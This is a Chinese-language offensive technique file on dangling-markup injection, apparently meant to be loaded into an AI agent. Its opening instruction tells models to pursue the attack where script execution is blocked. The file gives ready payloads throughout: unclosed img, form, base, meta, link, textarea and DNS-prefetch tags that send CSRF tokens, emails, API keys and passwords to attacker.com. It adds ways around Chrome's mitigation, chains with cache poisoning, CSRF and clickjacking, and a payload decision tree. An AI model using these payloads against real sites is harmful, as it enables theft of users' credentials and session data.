# 技巧：悬空标记注入——无需 JavaScript 的数据窃取

> **AI 加载指令**：涵盖通过未闭合的 img/form/base/meta/link/table 标签进行悬空标记窃取，可窃取的内容（CSRF 令牌、预填充表单值、敏感内容）、浏览器特定行为以及与其他攻击的组合。基础模型在内容安全策略（CSP）阻止脚本执行时通常会完全忽略此技术，直接跳转到“不可利用”的结论——悬空标记才是答案。

## 0. 相关路由

- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) 当完整 XSS 可用时（无需悬空标记）
- [csp-bypass-advanced](../csp-bypass-advanced/SKILL.md) 当内容安全策略（CSP）阻止 JS 执行时——悬空标记绕过脚本限制
- [csrf-cross-site-request-forgery](../csrf-cross-site-request-forgery/SKILL.md) 当悬空标记窃取 CSRF 令牌以进行后续 CSRF 攻击时
- [crlf-injection](../crlf-injection/SKILL.md) 当回车换行符（CRLF）在 HTTP 响应中启用 HTML 注入时
- [web-cache-deception](../web-cache-deception/SKILL.md) 当悬空标记 + 缓存中毒放大攻击时

---

## 1. 何时使用悬空标记

当以下所有条件都满足时，您需要悬空标记：

1. 您有一个 HTML 注入点（反射型或存储型）
2. JavaScript 执行被阻止：
   - 内容安全策略（CSP）阻止内联脚本和事件处理器
   - 清理器移除 `<script>`、`onerror`、`onload` 等
   - Web 应用防火墙（WAF）阻止已知的 XSS 模式
3. 页面在您的注入点之后包含敏感数据：
   - CSRF 令牌
   - 预填充表单值（电子邮件、用户名、API 密钥）
   - 隐藏字段中的会话标识符
   - 敏感用户内容

**核心洞察**：您不需要 JavaScript 来窃取数据——您只需要浏览器发起一个包含数据在 URL 中的请求。

---

## 2. 核心技巧

向服务器注入一个未闭合的 HTML 标签，其 `src`、`href`、`action` 或类似属性指向您的服务器。未闭合的属性引号“消耗”所有后续页面内容，直到浏览器找到匹配的引号。

```html
注入前的页面：
  <div>Hello USER_INPUT</div>
  <form>
    <input type="hidden" name="csrf" value="SECRET_TOKEN_123">
    <input type="text" name="email" value="user@target.com">
  </form>

注入的负载：
  <img src="https://attacker.com/collect?

生成的 HTML：
  <div>Hello <img src="https://attacker.com/collect?</div>
  <form>
    <input type="hidden" name="csrf" value="SECRET_TOKEN_123">
    <input type="text" name="email" value="user@target.com">
  </form>
  ...页面其余部分直到下一个匹配的引号（"）...
```

浏览器将 `https://attacker.com/collect?` 之后的全部内容解释为 URL。隐藏的 CSRF 令牌和电子邮件值成为发送到 `attacker.com` 的 URL 查询字符串的一部分。

---

## 3. 窃取向量

### 3.1 图像标签（最常见）

```html
<!-- 双引号上下文 -->
<img src="https://attacker.com/collect?

<!-- 单引号上下文 -->
<img src='https://attacker.com/collect?

<!-- 反引号上下文（仅 IE，遗留） -->
<img src=`https://attacker.com/collect?
```

浏览器向 `attacker.com` 发送 GET 请求，并将所有消耗的内容作为查询参数。

**被阻止**：`img-src` CSP 指令

### 3.2 表单动作劫持

```html
<form action="https://attacker.com/collect">
<button>点击继续</button>
<!--
```

如果页面在注入点之后有表单元素，下一个 `</form>` 会关闭攻击者的表单。所有输入字段在之间成为攻击者的表单部分→在用户交互时提交到攻击者。

**被阻止**：`form-action` CSP 指令

**技巧**：即使没有用户交互，如果存在现有的提交按钮或 JavaScript 自动提交，表单会自动提交。

### 3.3 基标签劫持

```html
<base href="https://attacker.com/">
```

页面上的所有后续相对 URL 都解析到攻击者的服务器：
- `<script src="/js/app.js">` → 加载 `https://attacker.com/js/app.js`
- `<a href="/profile">` → 链接到 `https://attacker.com/profile`
- `<form action="/submit">` → 提交到 `https://attacker.com/submit`

**被阻止**：`base-uri` CSP 指令

### 3.4 Meta 刷新重定向

```html
<meta http-equiv="refresh" content="0;url=https://attacker.com/collect?
```

将整个页面重定向到攻击者的服务器，并将消耗的页面内容包含在 URL 中。

**被阻止**：`navigate-to` CSP 指令（很少设置），某些浏览器在存在 CSP 时忽略 meta 刷新。

### 3.5 Link/样式表窃取

```html
<link rel="stylesheet" href="https://attacker.com/collect?
```

浏览器将 URL 请求为 CSS 资源，泄露消耗的内容。

**被阻止**：`style-src` CSP 指令

### 3.6 表格背景（遗留）

```html
<table background="https://attacker.com/collect?
```

在支持 `background` 属性的旧版浏览器中有效。

**被阻止**：`img-src` CSP 指令

### 3.7 视频/音频海报

```html
<video poster="https://attacker.com/collect?
<audio src="https://attacker.com/collect?
```

**被阻止**：`media-src` / `img-src` CSP 指令

---

## 4. 可窃取的内容

| 目标数据 | 页面中如何出现 | 窃取技巧 |
|---|---|---|
| CSRF 令牌 | `<input type="hidden" name="csrf" value="...">` | 在表单之前使用悬空 `<img src=` |
| 预填充电子邮件 | `<input value="user@example.com">` | 在输入之前注入悬空标签 |
| 页面中的 API 密钥 | `var apiKey = "sk-..."` 在内联脚本中 | 在脚本块之前注入悬空标签 |
| 隐藏字段中的会话 ID | `<input name="session" value="...">` | 在表单之前注入悬空标签 |
| 自动填充的密码 | 浏览器自动填充密码字段 | `<form action=attacker>` 与匹配的输入名称 |
| OAuth 状态/令牌 | 在 URL 参数或隐藏表单字段中 | 在授权页面上注入悬空标签 |
| 内部 URL/路径 | 链接、脚本源、API 端点 | `<base>` 标签劫持捕获所有相对 URL |

---

## 5. 浏览器特定行为

| 浏览器 | 行为 |
|---|---|
| **Chrome/Chromium** | 在 `<img>` `src` 包含 `<` 或换行符时阻止悬空标记（自 Chrome 60 起）。仍然允许 `<form action>`、`<base>`、`<link>`。 |
| **Firefox** | 对图像源中的悬空标记更宽松。允许属性值中的换行符。 |
| **Safari** | 与 Chrome 的限制类似。可能在边缘情况中处理不同。 |
| **Edge (Chromium)** | 与 Chrome 行为相同。 |

### Chrome 缓解细节

Chrome 在 URL 属性值包含以下内容时阻止导航/资源加载：
- `<` 字符（表示 HTML 标签消耗）
- 换行符 (`\n`, `\r`)

**绕过**：使用 `<form action>` 而不是 `<img src>`——Chrome 仅针对特定标签进行阻止。

---

## 6. 高级技巧

### 6.1 选择性消耗

策略性地选择引号类型：如果页面使用 `"` 作为属性值，则用 `'` 注入（反之亦然），以精确控制消耗停止的位置。

### 6.2 Textarea + 表单组合

`<form action="https://attacker.com/collect"><textarea name="data">` — 未闭合的 textarea 将所有后续 HTML 作为纯文本消耗；表单提交将其发送到攻击者。

### 6.3 注释/样式悬空

- `<!-- ` 没有关闭 `-->` 消耗所有内容（不用于窃取，但隐藏页面内容）
- `<style>` 未闭合将页面视为 CSS；结合 `@import url("https://attacker.com/?` 用于窃取

### 6.4 Window.name 通过 iframe

`<iframe src="https://target.com/page" name="` — name 属性消耗内容，并在导航后持久化 `window.name` 跨源。

---

## 7. 限制

| 限制 | 详情 |
|---|---|
| 同源内容仅限 | 悬空标记仅捕获来自同一 HTTP 响应的内容 |
| 引号匹配 | 消耗在下一个匹配的引号字符处停止——可能无法到达目标数据 |
| CSP img-src/form-action | 严格的 CSP 可以阻止大多数窃取向量 |
| Chrome 的悬空标记缓解 | 阻止 `<img src=` 包含 `<` 或换行符的 URL |
| 注入点必须在目标数据之前 | 只能捕获在 HTML 源顺序中出现在注入点之后的内容 |
| 内容编码 | 捕获的内容中的 URL-不安全字符可能会损坏 |

---

## 8. 组合攻击

### 8.1 悬空标记 + 开放重定向

```
1. 注入 <img src="https://target.com/redirect?url=https://attacker.com/collect?
2. 目标网站的重定向使请求对某些 CSP 检查为“同源”
3. 重定向将捕获的数据发送到攻击者
```

### 8.2 悬空标记 + 缓存中毒

```
1. 找到反射型 HTML 注入点
2. 注入悬空标记负载
3. 如果响应被缓存，所有用户都会看到悬空标记
4. 所有受害者的令牌/数据被窃取
```

这将反射型注入转换为存储型/持久化攻击。

### 8.3 悬空标记 + CSRF

```
1. 使用悬空标记从页面窃取 CSRF 令牌
2. 使用被盗令牌执行 CSRF 攻击
3. 即使令牌正确实现，也允许 CSRF
```

### 8.4 悬空标记 + 点击劫持

```
1. 注入 <form action="https://attacker.com/collect"><textarea name="data">
2. 如果允许 frame-ancestors，将页面嵌入框架中
3. 通过点击劫持覆盖层诱使用户点击“提交”
4. 表单提交所有捕获的页面内容到攻击者
```

---

## 9. 悬空标记决策树

```
HTML 注入存在但 XSS 被阻止（CSP/清理器/WAF）？
│
├── 确定注入上下文
│   ├── 在属性值内？→ 首先打破："><img src="https://attacker.com/collect?
│   ├── 在标签内容内？→ 直接注入： <img src="https://attacker.com/collect?
│   └── 在脚本块内？→ 首先关闭脚本： </script><img src="...
│
├── 注入点之后存在哪些敏感数据？
│   ├── CSRF 令牌 → 高价值：窃取令牌 → CSRF 攻击
│   ├── 用户 PII（电子邮件、姓名）→ 数据窃取
│   ├── API 密钥 / 密码 → 账户妥协
│   ├── 注入点之后没有敏感数据 → 悬空标记在此处无用处
│   └── 检查不同页面——注入可能在包含敏感数据的页面上
│
├── 根据CSP选择窃取向量
│   ├── 无 CSP / 宽松 CSP → <img src="...  (最简单)
│   ├── img-src 受限？
│   │   ├── form-action 未受限？ → <form action="attacker"><textarea name=d>
│   │   ├── base-uri 未受限？ → <base href="attacker">
│   │   └── style-src 未受限？ → <link rel=stylesheet href="...
│   ├── 所有指令都有严格的 CSP？
│   │   ├── meta 刷新？ → <meta http-equiv="refresh" content="0;url=attacker?
│   │   ├── DNS 预取？ → <link rel=dns-prefetch href="//data.attacker.com">
│   │   └── Window.name 通过 iframe？ → <iframe name="...
│   └── 什么也行不通？→ 悬空标记被阻止，尝试其他方法
│
├── 处理 Chrome 的悬空标记缓解
│   ├── 目标使用 Chrome？→ 避免 <img src= 包含 `<` 或换行符
│   ├── 使用 <form action=> 而不是（不被阻止）
│   ├── 使用 <base href=> （不被阻止）
│   └── 作为备用在 Firefox 中测试（更宽松）
│
├── 选择引号类型以最大程度捕获
│   ├── 目标数据使用双引号？→ 用单引号注入： <img src='...
│   ├── 目标数据使用单引号？→ 用双引号注入： <img src="...
│   └── 混合引号？→ 测试两者，看哪个捕获更多有用数据
│
└── 放大
    ├── 响应被缓存？→ 中毒缓存 → 从多个受害者窃取
    ├── 存储型注入？→ 每次页面查看都会窃取
    └── 仅反射型？→ 通过钓鱼链接交付
```

---

## 10. 技巧笔记——AI 模型遗漏的内容

1. **悬空标记是在 CSP 阻止脚本但 HTML 注入存在时的答案**。在 XSS 上训练的模型通常在严格 CSP 时得出“不可利用”的结论——悬空标记不需要 JavaScript。
2. **Chrome 的缓解是针对特定标签的，而不是通用的**：`<img src=` 被缓解，但 `<form action=`, `<base href=`, `<meta http-equiv=refresh>` 都不是。始终尝试替代向量。
3. **引号类型选择至关重要**：如果页面使用 `"` 作为属性值，则用 `'` 注入（反之亦然）以控制消耗停止的确切位置。错误的引号类型 = 捕获无用的内容或无内容。
4. **注入点位置非常重要**：注入必须出现在 HTML 源中目标数据之前。如果 CSRF 令牌在您的注入点之上，悬空标记无法捕获它。
5. **`<textarea>` 是最被低估的向量**：未闭合的 textarea 将所有后续 HTML 作为纯文本消耗。与表单动作劫持结合，当 img-src 受限时是最可靠的方法。
6. **Window.name 跨源持久化**：如果您可以注入 iframe，`name` 属性技术很强大，因为 `window.name` 在跨源导航后仍然存在——一种罕见的跨源数据通道。
7. **DNS 预取窃取即使在严格 CSP 下也有效**：`<link rel=dns-prefetch href="//stolen-data.attacker.com">` 触发 CSP 无法阻止的 DNS 查询。每个标签标签限制为约 253 个字符，但足以用于令牌。
